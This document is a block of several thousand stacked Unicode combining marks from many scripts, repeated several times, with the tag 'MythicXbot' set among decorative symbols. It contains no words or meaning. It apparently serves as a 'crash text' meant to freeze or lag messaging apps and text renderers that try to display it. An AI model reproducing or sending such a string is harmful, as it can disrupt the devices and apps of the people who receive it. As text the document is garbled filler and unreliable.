๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊